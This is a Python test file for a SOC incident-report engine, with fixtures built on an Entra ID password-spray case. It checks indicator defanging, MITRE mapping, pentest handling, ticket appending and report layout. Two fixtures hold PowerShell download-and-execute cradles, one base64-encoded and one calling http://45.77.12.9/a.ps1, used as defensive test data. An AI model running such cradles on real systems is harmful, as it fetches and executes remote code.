"""SOC decision engine: outcome selection, pentest handling, remediation check and formatting."""

import re

from stark.mitre import auto_map
from stark.observables import defang_final
from stark.soc import normalise_record, write

URL = "https://security.microsoft.com/incidents/77"


def base(**kw):
    ev = [
        {"time": "2026-11-20T02:10:01Z", "product": "Microsoft Entra ID", "event": "Sign-in failed", "host": "",
         "user": "jdoe@contoso.com", "flow": "45.77.12.9 -> ?", "detail": "50126 invalid password", "action": "failure",
         "src_ip": "45.77.12.9", "dst_ip": ""},
        {"time": "2026-11-20T02:14:40Z", "product": "Microsoft Entra ID", "event": "Sign-in succeeded", "host": "",
         "user": "jdoe@contoso.com", "flow": "45.77.12.9 -> ?", "detail": "", "action": "success",
         "src_ip": "45.77.12.9", "dst_ip": ""},
    ]
    c = {"id": 1, "ref": "CASE-2026-0001", "title": "Password spray", "alert_name": "Password spray against Entra ID",
         "customer": "Contoso", "finding_id": "F-1001", "alert_url": URL, "siem": "Microsoft Sentinel",
         "alert_created": "2026-11-20T02:20:00Z", "threat_id": "77",
         "findings": [
             {"key": "auth:spray:45.77.12.9", "category": "auth", "title": "Password spraying from 45.77.12.9 against 12 accounts",
              "severity": "high", "confidence": "high", "status": "open", "description": "45.77.12.9 tried 12 accounts.",
              "mitre": [{"id": "T1110.003"}], "entities": {"users": ["jdoe@contoso.com"], "ips": ["45.77.12.9"]},
              "evidence": ev[:1], "count": 24, "first": "2026-11-20T02:10:01Z", "last": "2026-11-20T02:14:00Z"},
             {"key": "auth:bruteforce-success:jdoe", "category": "auth", "title": "Successful login after 6 failures for jdoe@contoso.com",
              "severity": "critical", "confidence": "high", "status": "open", "description": "jdoe signed in after 6 failures.",
              "mitre": [{"id": "T1110"}, {"id": "T1078"}], "entities": {"users": ["jdoe@contoso.com"]},
              "evidence": ev, "count": 7, "first": "2026-11-20T02:10:01Z", "last": "2026-11-20T02:14:40Z"}],
         "observables": [{"value": "45.77.12.9", "type": "ipv4", "verdict": "malicious", "flagged_by": ["abuseipdb", "greynoise"],
                          "families": [], "tags": [], "enriched_at": 1, "sources_checked": 5,
                          "results": [{"provider": "abuseipdb", "verdict": "malicious", "summary": "840 reports: SSH brute force",
                                       "link": "https://www.abuseipdb.com/check/45.77.12.9"},
                                      {"provider": "otx", "verdict": "harmless", "summary": "no pulses",
                                       "link": "https://otx.alienvault.com/indicator/ip/45.77.12.9"}]}],
         "artifacts": [{"kind": "user", "value": "jdoe@contoso.com"}], "events": [], "actions": [], "techniques": []}
    c.update(kw)
    c["techniques"] = [{"technique_id": t["id"], "name": t["name"], "tactic": t["tactic"], "basis": t["basis"]}
                       for t in auto_map(c)]
    return c


def customer_part(md):
    return md.split("CUSTOMER REPORT STARTS BELOW**", 1)[1]


def test_final_dot_defang():
    assert defang_final("https://bad.example.com/a") == "hxxps://bad.example[.]com/a"
    assert defang_final("192.0.2.10") == "192.0.2[.]10"
    assert defang_final("10.1.2.3") == "10.1.2.3"
    assert defang_final("2001:db8::1") == "2001:db8::1"
    assert defang_final(defang_final("evil.co.uk")) == "evil.co[.]uk"


def test_auto_mitre_from_findings_intel_and_artifacts():
    c = base(artifacts=[{"kind": "command_line", "value": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}],
             alert_name="Successful logon")
    ids = {t["id"]: t for t in auto_map(c)}
    assert "T1110.003" in ids and ids["T1110.003"]["basis"][0].startswith("Finding:")
    assert "T1059.001" in ids and "artifact" in ids["T1059.001"]["sources"]
    assert "T1110" in ids  # threat intel ("brute force") and the finding agree
    # context-only patterns are not mapped from text alone
    assert "T1078" in ids and "finding" in ids["T1078"]["sources"]
    c2 = base(findings=[], alert_name="Successful logon 4624", observables=[])
    assert "T1078" not in {t["id"] for t in auto_map(c2)}


def test_incident_report_structure_and_formatting():
    r = write(base())
    md = r["markdown"]
    assert r["outcome"] == 3 and r["verdict"]["label"] == "True Positive - Malicious"
    assert md.startswith("**ANALYST-ONLY — DO NOT COPY**")
    for h in ("## 1. Investigation Completeness", "## 2. Missing Investigation Work", "## 3. Ticket Notification Decision",
              "## 4. Overall Priority Determination", "## Executive Summary", "## Analysis", "## Recommendation",
              "## Action Taken", "## Artifacts"):
        assert h in md, h
    assert "**Verdict:** True Positive - Malicious - **Confidence:** High" in md
    cust = customer_part(md)
    assert "Verdict" not in cust and "%" not in cust.split("## Artifacts")[0]
    assert cust.strip().startswith("## Executive Summary\n\nWe are raising this incident regarding")
    assert "45.77.12[.]9" in md and "45.77.12.9`" not in md          # final-dot defang
    assert "`jdoe@contoso.com`" in md                                  # accounts stay exact
    assert URL in md                                                   # alert link stays live
    assert "|" not in md.replace("](", "")                             # no tables
    assert "we recommend" not in cust.split("## Analysis")[1].split("## Recommendation")[0].lower()
    assert "Reset the password of `jdoe@contoso.com`, revoke active sessions and refresh tokens, and re-register MFA." in md
    recs = cust.split("## Recommendation")[1].split("## Action Taken")[0]
    assert 3 <= len(re.findall(r"^- ", recs, re.M)) <= 5


def test_pentest_ignore_closes():
    note = {"_type": "pentest-note", "title": "Q4 external test", "details": "Password spraying", "tester_ips": "45.77.12.0/24",
            "starts_on": "2026-11-18", "ends_on": "2026-11-22", "client_instruction": "ignore"}
    _, p = normalise_record(note)
    r = write(base(), pentest_notes=[p])
    assert r["outcome"] == 2
    assert r["markdown"].startswith("Closing as non-threatening. Our analysis shows that")
    assert "Q4 external test" in r["markdown"] and "ignore alerts related to this test" in r["markdown"]
    assert "**Verdict:**" not in r["markdown"] and "ANALYST-ONLY" not in r["markdown"]


def test_pentest_outside_window_is_not_covered():
    p = {"title": "Old test", "details": "Password spraying", "tester_ips": ["45.77.12.9"], "starts_on": "2026-10-01",
         "ends_on": "2026-10-05", "client_instruction": "ignore"}
    r = write(base(), pentest_notes=[p])
    assert r["outcome"] == 3
    assert r["related"]["pentests"][0]["related"] and not r["related"]["pentests"][0]["covered"]


def test_unrelated_pentest_is_never_mentioned():
    p = {"title": "Shop web test", "details": "Burp Suite against shop", "tester_ips": ["198.51.100.7"],
         "starts_on": "2026-11-18", "ends_on": "2026-11-22", "client_instruction": "ignore"}
    md = write(base(), pentest_notes=[p])["markdown"]
    assert "Shop web test" not in md and "pentest" not in md.lower() and "penetration" not in md.lower()


def test_unannounced_pentest_raised_and_hidden_from_client():
    p = {"title": "Red team Nov", "details": "Spray", "tester_ips": ["45.77.12.9"], "starts_on": "2026-11-18", "ends_on": "",
         "client_instruction": "unannounced"}
    r = write(base(), pentest_notes=[p])
    assert r["outcome"] == 3
    md = r["markdown"]
    assert "**UNANNOUNCED PENTEST — DO NOT INFORM THE CLIENT IT IS A PENTEST.**" in md
    cust = customer_part(md).lower()
    for word in ("pentest", "penetration", "red team", "red team nov", "authorized test", "scope"):
        assert word not in cust, word
    # never closed, even when forced
    assert write(base(), pentest_notes=[p], force=2)["outcome"] == 3


def test_raise_and_confirm_asks_for_scope():
    p = {"title": "Q4 external test", "details": "Password spraying", "tester_ips": ["45.77.12.9"], "starts_on": "2026-11-18",
         "ends_on": "2026-11-22", "client_instruction": "raise_and_confirm"}
    r = write(base(), pentest_notes=[p])
    assert r["outcome"] == 3 and r["verdict"]["key"] == "tp_malicious"   # the note never lowers the verdict
    cust = customer_part(r["markdown"])
    assert "which is listed for your penetration test Q4 external test; please confirm whether it is within the scope" in cust
    recs = cust.split("## Recommendation")[1]
    assert recs.split("- ", 1)[1].startswith("Confirm that the activity from")


def test_append_to_open_ticket():
    t = normalise_record({"case number": "INC0012345", "status": "IN_PROGRESS", "subject": "Spray from 45.77.12.9",
                          "description": "Password spray from 45.77.12.9", "updated_on": "2026-11-19T12:00:00Z",
                          "findings": ["F-0999"]})[1]
    r = write(base(), tickets=[t])
    md = r["markdown"]
    assert r["outcome"] == 1 and r["target"] == "INC0012345"
    assert md.startswith('Appending finding "F-1001" to "INC0012345" as similar entities have been observed. Our analysis shows that')
    for h in ("## OSINT Info", "## Similar Entities Found", "## New Entities Found"):
        assert h in md
    assert md.rstrip().endswith("Kindly follow initial recommendations. Thank you.")
    assert "**Verdict:**" not in md
    # already contains the finding -> not appended again
    t2 = {**t, "findings": ["F-1001"]}
    r2 = write(base(), tickets=[t2])
    assert r2["outcome"] == 3 and "already part of the open ticket INC0012345" in r2["markdown"]
    # closed tickets are not appended to; same alert name alone is not a match
    assert write(base(), tickets=[{**t, "status": "CLOSED"}])["outcome"] == 3
    assert write(base(), tickets=[{**t, "subject": "Spray", "description": "Spray"}])["outcome"] == 3


def test_remediation_check():
    c = base()
    for f in c["findings"]:
        for e in f["evidence"]:
            e["action"], e["event"] = "failure", "Sign-in failed"
    c["findings"] = c["findings"][:1]
    t = {"case_number": "INC0011111", "status": "CLOSED", "subject": "Spray", "description": "Spray",
         "close_notes": "Client blocked 45.77.12.9 on the firewall and reset the password of jdoe@contoso.com on 2026-11-19.",
         "updated_on": "2026-11-19T12:00:00Z", "findings": []}
    r = write(c, tickets=[t])
    assert r["outcome"] == 2 and "INC0011111" in r["markdown"]
    # the same activity succeeding after the remediation cannot be closed
    r2 = write(base(), tickets=[t])
    assert r2["outcome"] == 3
    assert "does not settle this finding" in r2["markdown"]
    # vague close notes are not a remediation
    r3 = write(c, tickets=[{**t, "close_notes": "Resolved"}])
    assert r3["outcome"] == 3


def test_benign_with_matching_closure():
    c = base(findings=[], observables=[{"value": "45.77.12.9", "type": "ipv4", "verdict": "harmless", "flagged_by": [],
                                        "families": [], "tags": [], "enriched_at": 1,
                                        "results": [{"provider": "otx", "verdict": "harmless", "link": "https://otx"}]}],
             events=[{"time": "2026-11-20T03:00:00Z", "text": "jdoe@contoso.com sign-in from 45.77.12.9 failed (MFA)"}])
    cl = normalise_record({"_type": "fusion-closure", "detail": "jdoe@contoso.com from 45.77.12.9 (corporate VPN)",
                           "closure_note": "VPN egress", "closed_by": "A. Analyst", "closed_on": "2026-11-10T09:00:00Z"})[1]
    r = write(c, closures=[cl])
    assert r["outcome"] == 2 and "A. Analyst" in r["markdown"] and "**Related Closures:**" in r["markdown"]


def test_ioc_only_analysis_has_no_analyst_part():
    md = write(base(finding_id="", alert_name="", alert_url=""))["markdown"]
    assert md.startswith("**Verdict:**") and "ANALYST-ONLY" not in md and "Incident Details" not in md
    assert "## Analysis" in md and "## Recommendation" in md and "## Artifacts" in md and "## Executive Summary" not in md


def test_dotnet_type_names_are_not_domains():
    from stark.observables import defang_text
    out = defang_text("IEX(New-Object Net.WebClient).DownloadString('http://45.77.12.9/a.ps1')", style="final")
    assert "Net.WebClient" in out and "hxxp://45.77.12[.]9/a.ps1" in out
